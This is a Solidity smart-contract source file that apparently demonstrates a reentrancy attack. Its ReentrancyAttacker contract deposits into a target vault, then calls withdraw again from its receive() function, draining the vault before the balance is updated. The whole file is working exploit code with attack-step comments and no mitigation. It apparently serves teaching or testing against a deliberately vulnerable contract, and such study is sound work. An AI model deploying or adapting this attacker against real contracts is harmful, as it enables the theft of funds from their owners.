// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// @title ReentrancyAttacker
/// @notice Demonstrates how to drain `VulnerableVault` by re-entering `withdraw`
///         from the contract's `receive()` function while the victim balance has
///         not been updated yet.
contract ReentrancyAttacker {
    /// @notice The vault contract being attacked.
    IVulnerableVault public immutable vault;

    /// @notice Amount used per (re)entry into `withdraw`.
    ///         Also doubles as the attacker's initial deposit, so the vault's
    ///         `balances[attacker] >= amount` check passes on the first call.
    uint256 public immutable attackUnit;

    constructor(address vaultAddress, uint256 attackUnit_) {
        vault = IVulnerableVault(vaultAddress);
        attackUnit = attackUnit_;
    }

    /// @notice Kick off the attack. Must be called with exactly `attackUnit` wei
    ///         so this contract has a valid deposit recorded inside the vault.
    function attack() external payable {
        require(msg.value == attackUnit, "send exactly attackUnit");

        // Step 1: become a depositor so the vault's balance check passes.
        vault.deposit{value: attackUnit}();

        // Step 2: trigger the first withdraw. The vault will send ETH back to
        // this contract before zeroing out our balance, which lets `receive()`
        // re-enter `withdraw` repeatedly until the vault is empty.
        vault.withdraw(attackUnit);
    }

    /// @notice Re-entry point. Triggered whenever the vault sends ETH here.
    ///         While the vault still has funds, we call `withdraw` again.
    receive() external payable {
        if (address(vault).balance >= attackUnit) {
            vault.withdraw(attackUnit);
        }
    }
}
